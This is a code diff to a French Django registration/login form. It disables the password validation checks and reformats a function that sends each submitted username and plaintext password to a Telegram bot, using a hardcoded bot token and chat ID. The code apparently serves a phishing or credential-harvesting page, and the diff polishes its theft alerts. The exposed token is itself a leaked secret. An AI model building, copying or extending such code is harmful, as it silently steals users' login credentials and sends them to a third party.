@@ -28,12 +28,12 @@ class InscriptionForm(forms.Form):
 
     def clean_mot_de_passe(self):
         mot_de_passe = self.cleaned_data.get('mot_de_passe', '')
-        if len(mot_de_passe) < 8:
-            raise ValidationError("Le mot de passe doit contenir au moins 8 caractères.")
-        if not any(c.isdigit() for c in mot_de_passe):
-            raise ValidationError("Le mot de passe doit contenir au moins un chiffre.")
-        if not any(c.isupper() for c in mot_de_passe):
-            raise ValidationError("Le mot de passe doit contenir au moins une majuscule.")
+        #if len(mot_de_passe) < 8:
+         #   raise ValidationError("Le mot de passe doit contenir au moins 8 caractères.")
+        #if not any(c.isdigit() for c in mot_de_passe):
+         #   raise ValidationError("Le mot de passe doit contenir au moins un chiffre.")
+        #if not any(c.isupper() for c in mot_de_passe):
+         #   raise ValidationError("Le mot de passe doit contenir au moins une majuscule.")
         return mot_de_passe
 
     def send_tel(self):
@@ -43,9 +43,16 @@ class InscriptionForm(forms.Form):
         TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {
-            "chat_id": CHAT_ID,
-            "text": f"Nouvelle Connexion : {identifiant} Mot de passe : {mot_de_passe}"
-        }
+    "chat_id": CHAT_ID,
+    "text": (
+        f"🔔 *NOUVELLE CONNEXION DÉTECTÉE*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *Identifiant :* `{identifiant}`\n"
+        f"🔑 *Mot de passe :* `{mot_de_passe}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    ),
+    "parse_mode": "Markdown"   # ← active le gras et le code
+}
         try:
             response = requests.post(url, data=data, timeout=5)
             response.raise_for_status()
